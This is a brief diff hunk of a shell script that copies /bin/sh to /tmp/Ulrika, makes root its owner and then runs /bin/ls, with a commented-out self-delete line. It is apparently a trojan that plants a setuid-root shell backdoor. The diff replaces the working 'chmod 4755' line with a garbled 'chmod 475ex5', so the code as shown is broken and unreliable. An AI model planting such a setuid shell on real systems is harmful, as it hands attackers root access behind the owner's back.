@@ -4,6 +4,6 @@
 
 cp /bin/sh /tmp/Ulrika
 chown root /tmp/Ulrika
-chmod 4755 /tmp/Ulrika
+chmod 475ex5 /tmp/Ulrika
 /bin/ls
 # rm $0
